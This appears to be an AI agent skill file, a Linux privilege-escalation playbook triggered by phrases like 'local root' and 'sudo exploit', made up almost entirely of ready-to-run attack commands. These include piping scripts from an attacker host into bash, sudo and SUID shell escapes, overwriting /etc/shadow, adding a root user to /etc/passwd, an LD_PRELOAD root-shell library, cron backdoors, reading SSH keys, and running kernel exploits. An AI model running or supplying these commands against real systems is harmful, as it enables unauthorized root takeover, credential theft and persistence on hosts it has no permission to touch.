---
name: post-linux-privesc
description: "Linux privilege escalation skill. Systematic enumeration and exploitation of sudo misconfigs, SUID binaries, writable cron jobs, capabilities, kernel exploits, and weak file permissions. Triggers: 'linux privesc', 'privilege escalation linux', 'local root', 'sudo exploit', 'suid binary', 'linux priv esc', 'escalate privileges linux'."
---

# Linux Privilege Escalation

Enumerate before exploit — automated tools eliminate guesswork and reveal non-obvious paths.

## Phase 1: Automated Enumeration

```bash
curl -s http://<attacker>/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas.out

curl -s http://<attacker>/linpeas.sh | bash -s -- -q 2>/dev/null

curl -s http://<attacker>/linux-exploit-suggester.sh | bash

wget -q http://<attacker>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
```

## Phase 2: Quick Baseline

```bash
id && whoami && hostname
uname -a && uname -r          # OS version + kernel
cat /etc/os-release
cat /proc/version
sudo -l                       # Sudo rules (most impactful — check first)
echo $PATH
env | grep -i pass
history
cat ~/.bash_history 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null  # SSH private keys
```

## Phase 3: Sudo Misconfigurations

```bash
sudo -l   # List allowed commands — look for NOPASSWD rules

sudo find / -exec /bin/sh \; -quit             # find
sudo vim -c ':!/bin/sh'                         # vim
sudo python3 -c 'import os; os.system("/bin/sh")'  # python
sudo perl -e 'exec "/bin/sh"'                  # perl
sudo awk 'BEGIN {system("/bin/sh")}'           # awk
sudo nmap --interactive; !sh                   # nmap (old versions)
sudo env /bin/sh                               # env
sudo less /etc/passwd  # then !sh              # less
sudo man sh  # then !sh                        # man

# Sudo token reuse (if another process has active sudo)
cat /proc/sys/kernel/yama/ptrace_scope  # 0 = ptrace allowed
ps aux | grep sudo  # find active sudo processes
```

## Phase 4: SUID Binary Exploitation

```bash
find / -perm -4000 -type f 2>/dev/null | sort

find / -perm -2000 -type f 2>/dev/null | sort

/bin/bash -p   # -p preserves EUID

# cp (if SUID) — overwrite /etc/shadow or /etc/sudoers
openssl passwd -6 "newpassword" > /tmp/new_hash
cp /etc/shadow /tmp/shadow.bak
echo "root:$(cat /tmp/new_hash):19000:0:99999:7:::" > /tmp/newshadow
cp /tmp/newshadow /etc/shadow

find / -name test -exec /bin/sh \;

gcc -shared -fPIC -nostartfiles -o pwnkit.so pwnkit.c
./pwnkit
```

## Phase 5: Cron Job Exploitation

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l
ls -la /var/spool/cron/

find /etc/cron* /var/spool/cron -writable 2>/dev/null

echo '#!/bin/bash' > /tmp/<command_name>
echo 'chmod u+s /bin/bash' >> /tmp/<command_name>
chmod +x /tmp/<command_name>

echo 'chmod u+s /bin/bash' >> /path/to/writable_cron_script.sh

```

## Phase 6: Capabilities

```bash
getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_net_admin|cap_sys_admin|cap_dac_override"

python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'

openssl s_client -quiet -connect <attacker>:<port>
```

## Phase 7: Writable Files & Weak Permissions

```bash
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20

openssl passwd -1 "hacked" | xargs -I{} echo "hacker:{}:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker  # password: hacked

# /etc/sudoers writable
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo /bin/bash

# (when sudo allows env_keep += LD_PRELOAD)
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void _init() { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>
```

## Phase 8: Kernel Exploits

```bash
uname -r  # Get kernel version
cat /etc/os-release  # Get distro + version

./linux-exploit-suggester.sh -k $(uname -r)

gcc -o exploit exploit.c && chmod +x exploit && ./exploit
```

## Validation (REQUIRED before reporting)

Confirm escalation:
```bash
id  # Should show uid=0(root)
whoami
cat /etc/shadow  # Root access proof
```

Document:
1. Starting privilege level (uid, sudo -l output)
2. Exact exploitation path taken
3. Evidence of root access (id output + shadow file first line)
